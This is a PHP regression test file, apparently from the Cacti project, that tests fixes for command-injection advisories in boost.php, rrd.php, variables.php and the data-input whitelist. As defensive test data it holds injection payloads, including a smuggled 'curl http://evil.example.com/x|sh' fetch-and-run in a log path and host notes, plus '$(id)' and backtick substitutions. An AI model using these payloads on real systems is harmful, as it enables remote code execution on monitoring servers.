<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2026 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
*/

require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
require_once dirname(__DIR__, 2) . '/include/global.php';
require_once dirname(__DIR__, 2) . '/lib/rrd.php';

// =====================================================================
// GHSA-wpjq: exec_background log path RCE (boost.php)
//
// boost.php lines 1847/1850 concatenate $boost_log directly into a
// shell redirect string without escapeshellarg().  An attacker who
// controls the stored "boost_log_path" setting can terminate the
// redirect and inject arbitrary shell commands.
// =====================================================================

test('GHSA-wpjq source: boost.php wraps boost_log with cacti_escapeshellarg in redirect', function () {
	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/boost.php');

	// The fix must escape boost_log before shell redirect concatenation.
	expect($source)->toContain('cacti_escapeshellarg($boost_log)');

	// The old unescaped pattern must no longer exist.
	expect($source)->not->toContain(">> ' . \$boost_log . ' 2>&1");
});

test('GHSA-wpjq unit: shell metacharacters in a log path survive redirect string construction', function () {
	// Simulate what boost.php does at lines 1847/1850.
	$boost_log     = '/tmp/x; curl http://evil.example.com/x|sh #';
	$redirect_args = '>> ' . $boost_log . ' 2>&1';

	// The injected payload is present verbatim in the resulting shell string.
	expect($redirect_args)->toContain('; curl http://evil.example.com/x|sh #');

	// A correct implementation wraps the path in single quotes via escapeshellarg,
	// so the shell treats the entire string as one literal argument and cannot
	// interpret the semicolon as a command separator.
	$safe_redirect = '>> ' . escapeshellarg($boost_log) . ' 2>&1';

	// The quoted form must start immediately after '>> ' with a single-quote,
	// meaning the shell sees one token rather than multiple commands.
	$after_redirect = substr($safe_redirect, strlen('>> '));
	expect($after_redirect)->toStartWith("'");
	expect($after_redirect)->toEndWith("' 2>&1");
});

// =====================================================================
// GHSA-8522: escape_command() is a no-op (rrd.php)
//
// rrd.php lines 33-34: escape_command() unconditionally returns its
// input unchanged.  Every call-site that passes user-influenced data
// through escape_command() before shell execution receives no protection.
// =====================================================================

test('GHSA-8522 source: escape_command strips command substitution patterns', function () {
	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/rrd.php');

	// The function must NOT contain the old no-op return.
	expect($source)->not->toContain("return \$command;\t");
	// It must strip backticks and $() substitution.
	expect($source)->toContain("str_replace('`', '', \$command)");
	expect($source)->toContain("preg_replace('/\\$\\(/', '(', \$command)");
});

test('GHSA-8522 unit: escape_command strips backtick and $() but preserves standalone $', function () {
	$payload = 'test `id` $(whoami) $5.00';

	$result = escape_command($payload);

	// Backticks stripped, $() converted to (), standalone $ preserved
	expect($result)->toBe('test id (whoami) $5.00');
	expect($result)->not->toContain('`');
});

// =====================================================================
// GHSA-xq98: host variable injection via substitute_host_data (variables.php)
//
// variables.php lines 362-367: host fields (description, notes, …) are
// substituted with str_replace() into command strings that are later
// passed to the shell.  escape_command() now strips backticks and $.
// =====================================================================

test('GHSA-xq98 unit: str_replace of host_description with command-substitution payload preserves metacharacters', function () {
	// Reproduce the substitution that substitute_host_data() performs.
	$command     = 'rrdtool update |host_description|.rrd N:1';
	$description = '$(id)';

	$result = str_replace('|host_description|', $description, $command);

	expect($result)->toContain('$(id)');
	expect($result)->toBe('rrdtool update $(id).rrd N:1');
});

test('GHSA-xq98 unit: str_replace of host_notes with backtick payload preserves execution context', function () {
	$command = 'rrdtool fetch |host_notes|.rrd AVERAGE';
	$notes   = '`curl http://evil.example.com/x|sh`';

	$result = str_replace('|host_notes|', $notes, $command);

	expect($result)->toContain('`curl http://evil.example.com/x|sh`');
});

test('GHSA-8522 contract: escape_command neutralizes command substitution', function () {
	$dangerous = 'valid_arg `id` $(whoami)';

	$result = escape_command($dangerous);

	// Backticks removed, $() neutralized
	expect($result)->not->toContain('`');
	expect($result)->not->toContain('$(');
	expect($result)->toBe('valid_arg id (whoami)');
});

// =====================================================================
// GHSA-c4qp: data input RCE via whitelist bypass (utility.php / data_input.php)
//
// Two independent bypass paths:
//   1. data_input.php line 98: input_string saved with empty regex (''),
//      so form_input_validate() accepts any value including shell commands.
//   2. utility.php line 1007: when CACTI_WHITELIST is not defined the
//      function returns true unconditionally — everything is permitted.
// =====================================================================

test('GHSA-c4qp source: data_input.php saves input_string with empty regex allowing any value', function () {
	$source = file_get_contents(dirname(__DIR__, 2) . '/data_input.php');

	// form_input_validate(…, 'input_string', '', true, 3) — third arg is the
	// regex pattern; an empty string means no pattern validation is applied.
	expect($source)->toContain("form_input_validate(gnrv('input_string'), 'input_string', '', true, 3)");
});

test('GHSA-c4qp source: data_input_whitelist_check returns true when CACTI_WHITELIST constant is not defined', function () {
	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/utility.php');

	// The early-return path that bypasses all whitelist enforcement.
	expect($source)->toContain("if (!defined('CACTI_WHITELIST'))");
	expect($source)->toContain('return true;');
});
